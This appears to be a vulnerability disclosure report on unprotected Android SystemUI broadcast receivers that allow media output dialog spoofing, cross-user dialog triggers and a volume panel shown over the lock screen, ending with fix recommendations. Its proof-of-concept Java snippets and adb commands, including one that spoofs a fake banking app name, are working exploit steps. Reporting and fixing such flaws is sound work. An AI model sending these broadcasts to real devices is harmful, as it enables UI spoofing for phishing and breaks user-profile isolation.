# VRP Report #32: SystemUI Unprotected Broadcast Receivers — Media Output Dialog Spoofing and Cross-User UI Trigger

## Summary
SystemUI's `MediaOutputDialogReceiver` handles three broadcast actions, but only one (`LAUNCH_SYSTEM_MEDIA_OUTPUT_DIALOG`) is declared as a protected broadcast. The sibling action `LAUNCH_MEDIA_OUTPUT_DIALOG` is NOT in the `protected-broadcast` list, enabling any unprivileged app to:
1. Force-display the system media output dialog attributed to any arbitrary package name
2. Target an arbitrary `UserHandle` (cross-user UI trigger, e.g., work profile)
3. Dismiss active media output dialogs

Additionally, `VolumePanelDialogReceiver` handles `LAUNCH_VOLUME_PANEL_DIALOG` and `android.settings.panel.action.VOLUME` — neither is protected, and receiving the broadcast triggers `activityStarter.dismissKeyguardThenExecute()` to show the volume panel.

## Affected Components

### MediaOutputDialogReceiver
- **Manifest**: line 521 — `exported="true"`, NO permission
- **File**: `com/android/systemui/media/dialog/MediaOutputDialogReceiver.java`
- **Actions**:
  - `com.android.systemui.action.LAUNCH_MEDIA_OUTPUT_DIALOG` — **NOT protected-broadcast**
  - `com.android.systemui.action.LAUNCH_SYSTEM_MEDIA_OUTPUT_DIALOG` — protected (line 288)
  - `com.android.systemui.action.DISMISS_MEDIA_OUTPUT_DIALOG` — **NOT protected-broadcast**

### VolumePanelDialogReceiver
- **File**: `com/android/systemui/volume/VolumePanelDialogReceiver.java`
- **Actions**: `LAUNCH_VOLUME_PANEL_DIALOG`, `android.settings.panel.action.VOLUME` — **NEITHER protected**
- Receipt triggers `activityStarter.dismissKeyguardThenExecute()` — bypasses keyguard to show volume panel

## Vulnerability Details

### Attacker-Controlled Parameters (No Validation)
From `MediaOutputDialogReceiver.onReceive()` (lines 41-53):
```java
String stringExtra = intent.getStringExtra("package_name");
UserHandle userHandle2 = (UserHandle) intent.getParcelableExtra("user_handle", UserHandle.class);
MediaSession.Token token = (MediaSession.Token) intent.getParcelableExtra("key_media_session_token", ...);
// No validation that package_name matches sender
// No validation that user_handle belongs to the sender's profile
MediaOutputDialogManager.createAndShow$default(this.mediaOutputDialogManager, userHandle2, stringExtra, token, 8);
```

### Impact
1. **UI Spoofing**: Attacker can display the system media output switcher dialog with any arbitrary package name displayed to the user (including non-installed or impersonated app names)
2. **Cross-User UI Trigger**: Attacker can target `UserHandle(10)` (work profile) to trigger the media output dialog for a different user, violating user isolation boundaries
3. **UI Disruption**: Any app can dismiss active media output dialogs via `DISMISS_MEDIA_OUTPUT_DIALOG`
4. **Keyguard Bypass (Volume)**: The volume panel actions trigger `dismissKeyguardThenExecute()`, allowing the volume panel to appear over the lock screen from any app's broadcast

## Proof of Concept

### Media Output Dialog Spoofing
```java
// Any app, zero permissions
Intent intent = new Intent("com.android.systemui.action.LAUNCH_MEDIA_OUTPUT_DIALOG");
intent.putExtra("package_name", "com.fake.banking.app");
sendBroadcast(intent);
// System media output dialog appears, attributed to "com.fake.banking.app"
```

### Cross-User Dialog Trigger
```java
Intent intent = new Intent("com.android.systemui.action.LAUNCH_MEDIA_OUTPUT_DIALOG");
intent.putExtra("package_name", "com.google.android.youtube");
intent.putExtra("user_handle", UserHandle.getUserHandleForUid(1000010)); // Work profile
sendBroadcast(intent);
```

### Keyguard Volume Panel Bypass
```java
Intent intent = new Intent("com.android.systemui.action.LAUNCH_VOLUME_PANEL_DIALOG");
sendBroadcast(intent);
// Volume panel appears, dismissing keyguard via dismissKeyguardThenExecute()
```

### ADB Commands
```bash
# Spoof media output dialog
adb shell am broadcast -a com.android.systemui.action.LAUNCH_MEDIA_OUTPUT_DIALOG \
  --es package_name "com.fake.banking.app"

# Trigger volume panel (bypasses keyguard)
adb shell am broadcast -a com.android.systemui.action.LAUNCH_VOLUME_PANEL_DIALOG
```

## Fix Recommendation
1. Add `LAUNCH_MEDIA_OUTPUT_DIALOG` and `DISMISS_MEDIA_OUTPUT_DIALOG` to the `protected-broadcast` list in the SystemUI manifest
2. Add `LAUNCH_VOLUME_PANEL_DIALOG` to the `protected-broadcast` list
3. For `LAUNCH_MEDIA_OUTPUT_DIALOG`: validate that the `package_name` extra matches the actual caller's package identity
4. Validate that `user_handle` matches the caller's user, preventing cross-user triggers

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
- SystemUI (SystemUIGoogle.apk) as bundled with the build
